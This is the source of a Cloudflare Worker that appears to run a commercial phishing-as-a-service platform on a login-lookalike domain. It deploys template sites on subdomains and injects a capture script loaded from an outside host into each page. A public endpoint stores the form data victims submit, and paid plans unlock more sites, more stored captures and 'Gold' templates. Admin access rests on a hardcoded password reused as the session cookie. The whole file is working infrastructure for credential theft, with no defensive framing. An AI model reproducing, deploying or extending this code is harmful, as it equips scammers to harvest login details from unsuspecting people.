/**
 * 🚀 D-TECH GLOBAL ROUTER V7.0 (API ONLY)
 * LOCATION: Cloudflare Worker
 */

const PASSWORD = "admin-secret-123";
const COOKIE_NAME = "admin_session";
const ROOT_DOMAIN = "account-login.co.za";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname; 

    // --- CORS HANDLING ---
    if (request.method === 'OPTIONS') {
      return handleOptions(request);
    }

    // Helper to wrap response with CORS headers
    const respond = (response) => {
        const corsHeaders = getCorsHeaders(request);
        const newHeaders = new Headers(response.headers);
        Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));

        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders
        });
    };

    // --- 1. ADMIN AUTHENTICATION & ROUTES ---
    const isAdminPath = url.pathname.startsWith('/admin') ||
                        url.pathname === '/api/save' ||
                        (url.pathname === '/api/captures' && request.method === 'GET') ||
                        url.pathname.startsWith('/api/admin');

    if (isAdminPath) {
        if (url.pathname === '/admin/login' && request.method === 'POST') {
            return respond(await handleLogin(request));
        }

        const isAuth = await checkAuth(request);
        if (!isAuth) {
            return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                status: 401,
                headers: {'Content-Type': 'application/json'}
            }));
        }

        if (url.pathname === '/api/save' && request.method === 'POST') {
            return respond(await handleSaveRequest(request, env));
        }

        if (url.pathname === '/api/captures' && request.method === 'GET') {
            return respond(await handleGetCaptures(env));
        }

        if (url.pathname === '/api/admin/templates') {
             if (request.method === 'GET') return respond(await handleGetTemplates(env));
             if (request.method === 'POST') return respond(await handleSaveTemplate(request, env));
             if (request.method === 'DELETE') return respond(await handleDeleteTemplate(request, env));
        }

        if (url.pathname === '/api/admin/sites') {
             if (request.method === 'GET') return respond(await handleGetSites(env));
             if (request.method === 'DELETE') return respond(await handleDeleteSite(request, env));
        }

        // Admin Payment & User Management
        if (url.pathname === '/api/admin/vouchers') {
             if (request.method === 'GET') return respond(await handleGetVouchers(env));
        }
        if (url.pathname === '/api/admin/voucher_action' && request.method === 'POST') {
             return respond(await handleVoucherAction(request, env));
        }
        if (url.pathname === '/api/admin/users' && request.method === 'GET') {
             return respond(await handleGetUsers(env));
        }

        return respond(new Response("Not Found", { status: 404 }));
    }

    // --- 2. PUBLIC API ENDPOINTS ---

    if (url.pathname === '/api/public/captures') {
        if (request.method === 'GET') return respond(await handleGetPublicCaptures(request, env));
        if (request.method === 'DELETE') return respond(await handleDeletePublicCapture(request, env));
    }

    if (url.pathname === '/api/public/sites' && request.method === 'DELETE') {
        return respond(await handleDeletePublicSite(request, env));
    }

    if (url.pathname === '/api/public/check-subdomain' && request.method === 'GET') {
        return respond(await handleCheckSubdomain(request, env));
    }

    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return respond(await handleCaptureRequest(request, env));
    }

    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
    }

    if (url.pathname === '/api/public/templates' && request.method === 'GET') {
        return respond(await handleGetPublicTemplates(env));
    }

    if (url.pathname === '/api/public/template-preview' && request.method === 'GET') {
        return await handleGetTemplatePreview(request, env); // Returns HTML directly
    }

    // Payment Submission
    if (url.pathname === '/api/pay' && request.method === 'POST') {
        return respond(await handlePaymentSubmit(request, env));
    }

    // --- 3. SUBDOMAIN ROUTING ---

    let subdomain = null;
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    if (subdomain && subdomain !== 'www') {
        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

        if (!data) {
           return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
               status: 404,
               headers: { 'Content-Type': 'text/html' }
           });
        }

        if (data.type === 'HTML') {
          return new Response(data.content, {
            headers: { 'Content-Type': 'text/html' }
          });
        }

        if (data.type === 'PROXY') {
          try {
            const targetUrl = data.content;
            const forwardUrl = new URL(targetUrl);
            forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
            forwardUrl.search = url.search;

            const proxyResponse = await fetch(forwardUrl.toString(), {
              headers: {
                'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
              }
            });

            const response = new Response(proxyResponse.body, proxyResponse);
            return response;

          } catch (err) {
            return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
          }
        }
    }

    return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
        headers: { 'Content-Type': 'application/json' }
    });
  }
};

// --- CORE LOGIC & HELPERS ---

async function getUser(env, code) {
    const key = `user::${code}`;
    const user = await env.SUBDOMAINS.get(key, { type: "json" });
    if (!user) {
        // Default Free User
        return {
            plan: 'free', // free, basic, premium
            strikes: 0,
            status: 'active', // active, locked, banned
            created: Date.now(),
            expiry: null
        };
    }

    // Check Expiry
    if (user.expiry && Date.now() > user.expiry) {
        user.plan = 'free';
        user.expiry = null;
        await env.SUBDOMAINS.put(key, JSON.stringify(user));
    }

    return user;
}

async function saveUser(env, code, data) {
    await env.SUBDOMAINS.put(`user::${code}`, JSON.stringify(data));
}

// --- HANDLERS ---

function getCorsHeaders(request) {
    const origin = request.headers.get('Origin');
    const allowedDomain = 'https://account-login.co.za';
    const newFrontend = 'https://new.preasx24.co.za';

    if (origin === allowedDomain || origin === newFrontend || (origin && origin.endsWith('.account-login.co.za'))) {
        return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'true'
        };
    }
    return {};
}

function handleOptions(request) {
    const headers = getCorsHeaders(request);
    return new Response(null, { headers: headers });
}

async function checkAuth(request) {
  const cookieHeader = request.headers.get('Cookie');
  if (!cookieHeader) return false;
  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
}

async function handleLogin(request) {
    try {
        const formData = await request.formData();
        const password = formData.get('password');
        if (password === PASSWORD) {
            return new Response(JSON.stringify({ success: true }), {
                headers: {
                    'Content-Type': 'application/json',
                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                }
            });
        }
        return new Response(JSON.stringify({ success: false, error: "Invalid Password" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError("Error processing request");
    }
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;
    if (!subdomain || !type || !content) return jsonError("Missing fields");

    const entry = { type, content, updated: Date.now() };
    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));
    return new Response(JSON.stringify({ success: true, subdomain, type }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}

async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }));

    // Also track capture count for stats if we want (optional, but good for admin)
    // For now we rely on listing keys.

    return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}

async function handleGetCaptures(env) {
  try {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys.slice(-20).reverse();
    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });
    const results = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
     return jsonError(err.message, 500);
  }
}

async function handleGetTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetSites(env) {
    try {
        const list = await env.SUBDOMAINS.list();
        const sites = [];
        for (const k of list.keys) {
            if (!k.name.startsWith('capture::') && !k.name.startsWith('template::') &&
                !k.name.startsWith('code_map::') && !k.name.startsWith('user::') &&
                !k.name.startsWith('voucher_queue')) {
                sites.push(k.name);
            }
        }
        return new Response(JSON.stringify({ success: true, data: sites }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        // Return object with metadata needed for UI logic (preview, gold status)
        return {
            name: k.name.replace("template::", ""),
            isGoldOnly: val.isGoldOnly || false,
            previewUrl: val.previewUrl || null
        };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveTemplate(request, env) {
    const body = await request.json();
    const { name, content, redirectUrl, isGoldOnly, previewUrl } = body;
    if (!name || !content) return jsonError("Missing fields");
    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({
        content,
        redirectUrl,
        previewUrl,
        isGoldOnly: isGoldOnly === true,
        updated: Date.now()
    }));
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteTemplate(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return jsonError("Missing name");
    await env.SUBDOMAINS.delete(`template::${name}`);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteSite(request, env) {
    const url = new URL(request.url);
    const subdomain = url.searchParams.get('subdomain');
    if (!subdomain) return jsonError("Missing subdomain");

    // Cleanup Code Map if needed (Admin deletion force)
    try {
        const siteData = await env.SUBDOMAINS.get(subdomain, { type: "json" });
        if (siteData && siteData.ownerCode) {
            const mapKey = `code_map::${siteData.ownerCode}`;
            const mapData = await env.SUBDOMAINS.get(mapKey, { type: "json" });
            if (mapData) {
                // Handle Array or Object
                let newSites = [];
                if (Array.isArray(mapData.sites)) {
                    newSites = mapData.sites.filter(s => s.subdomain !== subdomain);
                } else if (mapData.subdomain === subdomain) {
                    newSites = [];
                }

                if (newSites.length > 0) {
                     await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
                } else {
                     await env.SUBDOMAINS.delete(mapKey);
                }
            }
        }
    } catch (e) {} // Ignore cleanup errors

    await env.SUBDOMAINS.delete(subdomain);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const body = await request.json();
        let { subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl } = body;

        if (!subdomain || !uniqueCode) return jsonError("Missing subdomain or unique code");
        if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");

        // 1. Check User Plan & Limits
        const user = await getUser(env, uniqueCode);

        if (user.status === 'locked' || user.status === 'banned') {
            return jsonError("Account is locked due to payment issues. Contact support.");
        }

        const mapKey = `code_map::${uniqueCode}`;
        let codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });

        // Normalize codeMap to object with sites array
        let currentSites = [];
        if (codeMap) {
            if (Array.isArray(codeMap.sites)) {
                currentSites = codeMap.sites;
            } else if (codeMap.subdomain) {
                // Legacy Format
                currentSites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
            }
        }

        // --- LIMITS ---
        let limit = 1; // Free
        if (user.plan === 'basic') limit = 3;
        if (user.plan === 'premium') limit = 10; // Downgraded from 15
        if (user.plan === 'gold') limit = 1000; // Unlimited

        if (currentSites.length >= limit) {
             return jsonError(`Plan limit reached (${limit} sites). Delete a site to deploy a new one.`);
        }

        // 2. Check Subdomain Availability
        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) {
            // Check if it belongs to this user (replacing own site?)
            // If we just deleted it above, existingSub would still be found if we didn't wait?
            // KV is eventually consistent, but delete usually immediate for same colo.
            // However, to be safe, if we just decided to replace it, we are fine.
            // But if it's someone ELSE'S subdomain...
            const siteJson = JSON.parse(existingSub);
            if (siteJson.ownerCode !== uniqueCode) {
                return jsonError("Subdomain already taken");
            }
        }

        // 3. Prepare Content
        let htmlContent = '';
        let shouldInject = false;
        let actualTemplateName = null;

        if (templateName) {
            const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
            if (!templateData) return jsonError("Template not found");

            // --- GOLD CHECK ---
            if (templateData.isGoldOnly && user.plan !== 'gold') {
                return jsonError("This template is exclusive to Gold Plan members.");
            }

            // --- TEMPLATE USAGE LIMIT (Gold & Others) ---
            // "Unlimited deploys but limited to 3 deploys of each template"
            // We check how many times this specific template is used in currentSites
            const usageCount = currentSites.filter(s => s.templateName === templateName).length;
            if (usageCount >= 3) {
                return jsonError(`You have reached the limit (3) for deploying this specific template.`);
            }

            htmlContent = templateData.content;
            redirectUrl = templateData.redirectUrl || null;
            shouldInject = true;
            actualTemplateName = templateName;

        } else if (customHtml) {
            htmlContent = customHtml;
            shouldInject = (enableInjector === true);
            // redirectUrl is already extracted from the body.
            // If it's undefined or empty, we set it to null to be safe.
            if (!redirectUrl) redirectUrl = null;
        } else {
            return jsonError("Must provide a template or custom HTML");
        }

        const scriptUrl = 'https://new.preasx24.co.za/injection.js';
        if (shouldInject) {
            let injectionBlock = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;

            if (redirectUrl) {
                injectionBlock += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
            }

            injectionBlock += `<script src="${scriptUrl}"></script>`;

            if (htmlContent.includes('</body>')) {
                htmlContent = htmlContent.replace('</body>', `${injectionBlock}</body>`);
            } else {
                htmlContent += injectionBlock;
            }
        }

        // 4. Save Site
        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: htmlContent,
            updated: Date.now(),
            ownerCode: uniqueCode,
            isInjected: shouldInject,
            templateName: actualTemplateName
        }));

        // 5. Update Code Map
        // We store templateName here too for faster counting without fetching site content
        currentSites.push({
            subdomain,
            created: Date.now(),
            templateName: actualTemplateName
        });

        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: currentSites }));

        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicCaptures(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    const user = await getUser(env, code);

    // Check if locked
    if (user.status === 'locked' || user.status === 'banned') {
         // Return specialized error or just success:false with status
         return new Response(JSON.stringify({
             success: false,
             error: "Account Locked",
             accountStatus: user.status
         }), { headers: { 'Content-Type': 'application/json' } });
    }

    // Get Site Count & List
    const mapKey = `code_map::${code}`;
    const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
    let siteCount = 0;
    let sites = [];

    if (codeMap) {
        if (Array.isArray(codeMap.sites)) {
            sites = codeMap.sites;
            siteCount = sites.length;
        } else if (codeMap.subdomain) {
            // Legacy
            sites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
            siteCount = 1;
        }
    }

    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
    // Sort latest first
    const keys = list.keys.reverse();
    const totalCount = keys.length;

    // Apply Limits
    let limit = 5; // Free
    if (user.plan === 'basic') limit = 15;
    if (user.plan === 'premium') limit = 250; // Downgraded
    if (user.plan === 'gold') limit = 100000; // Unlimited

    const visibleKeys = keys.slice(0, limit);
    const hiddenCount = Math.max(0, totalCount - limit);

    const promises = visibleKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);
    return new Response(JSON.stringify({
        success: true,
        data: results,
        total: totalCount,
        hidden: hiddenCount,
        plan: user.plan,
        pendingPlan: user.pendingPlan, // Return pending status
        expiry: user.expiry,
        lastPayment: user.lastPaymentDate,
        siteCount: siteCount,
        sites: sites
    }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicSite(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const subdomain = url.searchParams.get('subdomain');

    if (!code || !subdomain) return jsonError("Missing fields");

    // 1. Verify Ownership
    const mapKey = `code_map::${code}`;
    const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
    let sites = [];
    if (codeMap) {
        if (Array.isArray(codeMap.sites)) sites = codeMap.sites;
        else if (codeMap.subdomain) sites = [{ subdomain: codeMap.subdomain }];
    }

    const ownsSite = sites.some(s => s.subdomain === subdomain);
    if (!ownsSite) return jsonError("Unauthorized: Site not found in your account", 403);

    // 2. Delete Subdomain KV
    await env.SUBDOMAINS.delete(subdomain);

    // 3. Update Code Map
    const newSites = sites.filter(s => s.subdomain !== subdomain);
    if (newSites.length > 0) {
        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
    } else {
        await env.SUBDOMAINS.delete(mapKey);
    }

    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleCheckSubdomain(request, env) {
    const url = new URL(request.url);
    const subdomain = url.searchParams.get('subdomain');
    if (!subdomain) return jsonError("Missing subdomain");

    const val = await env.SUBDOMAINS.get(subdomain);
    return new Response(JSON.stringify({ success: true, available: !val }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicCapture(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const key = url.searchParams.get('key');
    if (!code || !key) return jsonError("Missing fields");

    if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);

    await env.SUBDOMAINS.delete(key);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePaymentSubmit(request, env) {
    try {
        const body = await request.json();
        const { uniqueCode, voucherType, voucherCode } = body;
        if (!uniqueCode || !voucherType || !voucherCode) return jsonError("Missing fields");

        const user = await getUser(env, uniqueCode);
        if (user.status === 'banned') return jsonError("Account is permanently banned.");

        const requestedPlan = body.plan || 'premium'; // Default to premium if not specified
        let provisionalPlan = requestedPlan;
        let pendingStatus = null;

        // Gold Special Logic: Give Premium immediately, mark as Pending Gold
        if (requestedPlan === 'gold') {
            provisionalPlan = 'premium'; // Provisional access
            pendingStatus = 'gold';
            user.pendingPlan = 'gold'; // Store pending status
        } else {
             // For Basic/Premium, give immediate access (as per existing logic)
             // Or should we set them pending too? The prompt implies only Gold is strict pending.
             // "unlike the other plan payments where the users gets the access immediately for gold thy have to wait"
             // So others are immediate.
             provisionalPlan = requestedPlan;
             if (user.pendingPlan) delete user.pendingPlan; // Clear if downgrading/changing
        }

        user.plan = provisionalPlan;
        // Do NOT update expiry yet (wait for admin verification)

        await saveUser(env, uniqueCode, user);

        // Add to Admin Queue
        const voucherId = crypto.randomUUID();
        const voucherData = {
            id: voucherId,
            uniqueCode,
            voucherType,
            voucherCode,
            plan: requestedPlan, // The plan they WANT (e.g. Gold)
            submitted: Date.now(),
            status: 'pending'
        };

        await env.SUBDOMAINS.put(`voucher_queue::${voucherId}`, JSON.stringify(voucherData));

        let msg = "Payment submitted. Access granted pending review.";
        if (pendingStatus === 'gold') {
            msg = "Payment submitted. Provisional Premium access granted. Gold status pending verification.";
        }

        return new Response(JSON.stringify({ success: true, message: msg }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetVouchers(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
    const vouchers = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return val;
    }));
    // Filter only pending?
    const pending = vouchers.filter(v => v.status === 'pending');
    return new Response(JSON.stringify({ success: true, data: pending }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleVoucherAction(request, env) {
    try {
        const body = await request.json();
        const { voucherId, action, reason } = body; // action: 'approve' | 'decline'

        const voucherKey = `voucher_queue::${voucherId}`;
        const voucher = await env.SUBDOMAINS.get(voucherKey, { type: "json" });
        if (!voucher) return jsonError("Voucher not found");

        const user = await getUser(env, voucher.uniqueCode);

        if (action === 'approve') {
            // Solidify Plan
            const now = Date.now();
            let currentExpiry = user.expiry || now;
            if (currentExpiry < now) currentExpiry = now; // If expired, start from now

            // If pending gold, upgrade now
            if (user.pendingPlan === 'gold' && voucher.plan === 'gold') {
                user.plan = 'gold';
                delete user.pendingPlan;
            } else {
                // Ensure plan matches voucher (in case of drift)
                user.plan = voucher.plan;
            }

            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000); // Add 30 Days (Stackable)
            user.lastPaymentDate = now;
            user.status = 'active'; // Ensure active

            // Delete from queue
            await env.SUBDOMAINS.delete(voucherKey);

        } else if (action === 'decline') {
            // Revert Plan
            user.plan = 'free';
            if (user.pendingPlan) delete user.pendingPlan; // Clear pending

            user.status = 'locked'; // "Serious Red Warning"
            user.strikes = (user.strikes || 0) + 1;
            user.lockReason = reason || "Invalid Voucher";

            if (user.strikes >= 2) {
                user.status = 'banned';
            }

            await env.SUBDOMAINS.delete(voucherKey);
        }

        await saveUser(env, voucher.uniqueCode, user);

        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetUsers(env) {
    // This is expensive if many users. For now, we list `user::` prefix.
    const list = await env.SUBDOMAINS.list({ prefix: "user::" });
    const users = await Promise.all(list.keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { code: k.name.replace("user::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: users }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetTemplatePreview(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return new Response("Missing template name", { status: 400 });

    const templateData = await env.SUBDOMAINS.get(`template::${name}`, { type: "json" });
    if (!templateData) return new Response("Template not found", { status: 404 });

    let content = templateData.content;

    // Inject Preview Overlay & Disable Forms
    const overlayScript = `
        <style>
            body::before {
                content: "PREVIEW MODE - DATA CAPTURE DISABLED";
                position: fixed;
                top: 0; left: 0; right: 0;
                background: rgba(255, 215, 0, 0.9);
                color: black;
                text-align: center;
                padding: 10px;
                z-index: 999999;
                font-weight: bold;
                font-family: sans-serif;
                pointer-events: none;
            }
            form { pointer-events: none !important; opacity: 0.7; }
        </style>
        <script>
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelectorAll('form').forEach(f => f.onsubmit = (e) => { e.preventDefault(); alert('Preview Mode'); return false; });
                document.querySelectorAll('input, button').forEach(i => i.disabled = true);
            });
        </script>
    `;

    if (content.includes('</body>')) {
        content = content.replace('</body>', `${overlayScript}</body>`);
    } else {
        content += overlayScript;
    }

    return new Response(content, { headers: { 'Content-Type': 'text/html' } });
}

function jsonError(msg, status = 400) {
    return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
}
